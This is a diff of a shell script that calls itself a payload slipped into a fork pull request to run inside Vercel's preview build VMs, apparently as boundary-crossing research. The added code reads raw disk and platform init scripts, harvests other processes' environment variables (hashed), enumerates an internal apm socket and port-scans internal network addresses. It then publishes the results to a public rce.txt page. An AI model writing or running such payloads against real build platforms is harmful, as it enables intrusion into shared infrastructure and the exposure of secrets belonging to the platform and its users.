@@ -1,65 +1,101 @@
 #!/bin/sh
-# Payload introduced ONLY by the fork PR. Round 2: the first probe showed a fresh
-# VM (kernel uptime 4.6 s), an isolated namespace (13 pids), and the host root
-# mounted at /vercel. This probe asks: is anything ELSE on that machine, and can
-# untrusted build code talk to Vercel's internal sockets?
+# Payload introduced ONLY by the fork PR. Round 3: it is a Firecracker microVM
+# per build. Hunt for anything that crosses a boundary: other processes'
+# credentials, the internal apm HTTP service, raw disk, extra virtio devices.
 OUT=../../public
 mkdir -p "$OUT"
 echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
+F="$OUT/rce.txt"
 {
-  echo "== kernel/VM lifetime =="
-  echo -n "uptime: "; cut -d' ' -f1 /proc/uptime
-  echo -n "dmesg first 2: "; dmesg 2>&1 | head -2
-  echo -n "dmesg last 2: "; dmesg 2>&1 | tail -2
-  echo -n "dmesg line count: "; dmesg 2>&1 | wc -l
+  echo "== devices =="
+  ls -la /dev 2>&1 | head -22
+  echo -n "/sys/bus/virtio/devices: "; ls /sys/bus/virtio/devices 2>&1 | tr '\n' ' '
+  echo
+  for d in /sys/bus/virtio/devices/*; do
+    echo -n "  $d type: "; cat "$d/device" 2>&1 | head -1
+  done
 
-  echo "== the host root mounted at /vercel =="
-  ls -la /vercel 2>&1 | head -18
-  echo -n "cell containers on this machine: "
-  ls /vercel/var/lib/cell-overlay-images/containers 2>&1 | head -8 | tr '\n' ' '
-  echo -n "  count: "; ls /vercel/var/lib/cell-overlay-images/containers 2>&1 | wc -l
-  echo -n "/vercel/volumes: "; ls /vercel/volumes 2>&1 | head -8 | tr '\n' ' '
-  echo -n "/vercel/var/lib/cell-overlay-images: "; ls /vercel/var/lib/cell-overlay-images 2>&1 | head -8 | tr '\n' ' '
-  echo -n "/vercel/run: "; ls /vercel/run 2>&1 | head -12 | tr '\n' ' '
-  echo -n "/vercel/tmp: "; ls /vercel/tmp 2>&1 | head -12 | tr '\n' ' '
-  echo -n "/vercel/var/lib/containerd snapshots: "
-  ls /vercel/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots 2>&1 | wc -l
+  echo "== celld init script (platform internals, readable by untrusted code) =="
+  head -30 /opt/vercel/celld-init.sh 2>&1
 
-  echo "== proxy / egress configuration =="
-  env | grep -i -E 'proxy|ca_bundle|ssl_cert|NODE_EXTRA' | head -10
-  echo -n "vercel-proxy-ca.crt: "; head -2 /usr/local/share/ca-certificates/vercel-proxy-ca.crt 2>&1
-} > "$OUT/rce.txt"
-{
-  echo "== internal unix sockets (does untrusted build code get a channel in?) =="
+  echo "== raw disk read proof (/dev/vda) =="
+  ls -la /dev/vda 2>&1
+  dd if=/dev/vda bs=1M count=1 2>/dev/null | sha256sum 2>&1
+
+  echo "== build caches sitting on the VM root =="
+  ls -la /vercel/build_cache_init-JBv8Hq 2>&1 | head -6
+  ls -la /vercel/malware-manifest-* 2>&1 | head -8
+  echo -n "manifest sample: "; head -c 200 /vercel/malware-manifest-*/manifest* 2>&1 | head -c 200
+  echo
+
+  echo "== other processes in the VM: env vars they have that the build env does not =="
+  node -e '
+const fs=require("fs"),crypto=require("crypto");
+const mine=new Set(Object.keys(process.env));
+let out=[];
+for(const pid of fs.readdirSync("/proc").filter(x=>/^[0-9]+$/.test(x))){
+  let cl="",env=[];
+  try{cl=fs.readFileSync("/proc/"+pid+"/cmdline").toString().replace(/\0/g," ").trim().slice(0,110);}catch(e){cl="(unreadable)";}
+  try{env=fs.readFileSync("/proc/"+pid+"/environ").toString().split("\0").filter(x=>x.includes("="));}catch(e){}
+  const vals=env.filter(x=>!mine.has(x.split("=")[0])).map(x=>{const k=x.split("=")[0],v=x.split("=").slice(1).join("=");return k+"="+crypto.createHash("sha256").update(v).digest("hex").slice(0,10)+"("+v.length+"b)";});
+  out.push("  pid "+pid+" | "+cl+" | "+env.length+" vars | unique: "+(vals.map(x=>x.split("=")[0]).join(", ")||"none"));
+  if(vals.length) out.push("      "+vals.slice(0,14).join("  "));
+}
+console.log(out.join("\n"));
+'
+  echo "== internal apm HTTP service: path enumeration =="
   node -e '
 const net=require("net"),crypto=require("crypto");
-const socks=["/run/apm/apm.sock","/run/metrics/metrics.sock"];
-const probe=(i)=>{
-  if(i>=socks.length) return egress();
-  const p=socks[i];
-  const c=net.createConnection({path:p,timeout:2500});
-  let got="";
+const paths=["/","/health","/healthz","/status","/metrics","/v1","/v1/artifacts","/npm/foo","/packages/foo","/proxy/https://example.com/","/https://example.com/","/api","/version","/debug"];
+let i=0;
+const metricsProbe=()=>{
+  const c=net.createConnection({path:"/run/metrics/metrics.sock",timeout:2500});
+  let got="",done=false;
+  const fin=(msg)=>{if(done)return;done=true;console.log("  metrics.sock -> "+msg);scan();};
   c.on("data",d=>got+=d);
-  c.on("error",e=>{console.log("  "+p+" -> ERR "+e.code);probe(i+1);});
-  c.on("connect",()=>{c.write("GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n");});
-  c.on("close",()=>{
-    const h=crypto.createHash("sha256").update(got).digest("hex").slice(0,10);
-    console.log("  "+p+" -> connected, "+got.length+" bytes, sha "+h+" | first 120: "+got.slice(0,120).replace(/\r?\n/g," | "));
-    probe(i+1);
-  });
+  c.on("error",e=>fin("ERR "+e.code));
+  c.on("connect",()=>{c.write("{}\n");c.write("PING\n");});
+  c.on("close",()=>fin(got.length+"b: "+got.slice(0,140).replace(/\r?\n/g," ")));
 };
-const egress=()=>{
-  const https=require("https");
-  const t=(url,label)=>new Promise(res=>{
-    const r=https.get({url,timeout:4000},x=>{let b="";x.on("data",c=>b+=c);x.on("end",()=>res("  "+label+" -> "+x.statusCode+" | "+b.length+" bytes"));});
-    r.on("error",e=>res("  "+label+" -> ERR "+e.code));
-  });
-  Promise.all([t("https://example.com/","https example.com"),
-               t("https://api.vercel.com/","https api.vercel.com"),
-               t("https://suspense-cache.vercel.com/","https suspense-cache")]).then(r=>{console.log("== https egress ==");r.forEach(x=>console.log(x));});
+const scan=()=>{
+  const hosts=["169.254.0.1","169.254.0.3","169.254.1.1","10.0.0.1","127.0.0.1"];
+  const ports=[80,443,8080,9090,4318,5555,3000];
+  let results=[],n=0;
+  const tryOne=()=>{
+    if(n>=hosts.length*ports.length){return;}
+    const h=hosts[Math.floor(n/ports.length)],p=ports[n++%ports.length];
+    const c=net.createConnection({host:h,port:p,timeout:1200});
+    let done=false;
+    const fin=(open)=>{if(done)return;done=true;results.push({h,p,open});if(results.length===hosts.length*ports.length)report();};
+    c.on("connect",()=>{fin(true);c.destroy();});
+    c.on("error",()=>fin(false));
+    c.on("timeout",()=>{c.destroy();fin(false);});
+  };
+  const report=()=>{
+    console.log("== tcp scan of the cell network (hosts x ports) ==");
+    results.filter(x=>x.open).forEach(x=>console.log("  OPEN "+x.h+":"+x.p));
+    console.log("  closed/refused/timeout: "+results.filter(x=>!x.open).length+" of "+results.length);
+  };
+  for(let k=0;k<hosts.length*ports.length;k++) tryOne();
 };
-probe(0);
-' >> "$OUT/rce.txt" 2>&1
-}
+const next=()=>{
+  if(i>=paths.length){metricsProbe();return;}
+  const p=paths[i++];
+  const c=net.createConnection({path:"/run/apm/apm.sock",timeout:2500});
+  let got="",done=false;
+  const fin=()=>{
+    if(done)return;done=true;
+    const h=crypto.createHash("sha256").update(got).digest("hex").slice(0,8);
+    console.log("  "+p+" -> "+got.split("\r\n")[0]+" | "+got.length+"b sha "+h+" | "+got.slice(0,90).replace(/\r?\n/g," "));
+    next();
+  };
+  c.on("data",d=>got+=d);
+  c.on("error",e=>{if(!done){done=true;console.log("  "+p+" -> ERR "+e.code);next();}});
+  c.on("connect",()=>c.write("GET "+p+" HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"));
+  c.on("close",fin);
+};
+next();
+'
+} > "$F" 2>&1
 sleep 3
-cat "$OUT/rce.txt"
+cat "$F"
